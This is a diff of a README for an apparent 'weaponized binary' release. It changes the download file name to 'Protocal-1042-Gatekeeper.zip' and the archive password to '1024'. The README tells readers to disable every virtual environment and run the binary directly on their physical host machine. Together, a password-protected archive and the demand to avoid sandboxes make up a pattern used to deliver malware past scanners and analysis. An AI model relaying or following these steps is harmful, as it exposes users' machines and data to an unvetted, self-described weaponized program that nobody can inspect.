@@ -29,8 +29,8 @@ We do not hand out source code to the weak. Standard developers ask for reposito
 
 The weaponized binary is available under the **[Releases]** tab.
 
-1. Download the `Bangsaen_Mail_v1.zip` from Releases.
-2. **Password:** `BANGSAEN`
+1. Download the `Protocal-1042-Gatekeeper.zip` from Releases.
+2. **Password:** `1024`
 3. **CAUTION:** Strip your armor. Ensure all virtual environments are disabled. Run it on your Bare Metal host machine, or do not run it at all. 
 
 ## ⚖️ Legal Disclaimer
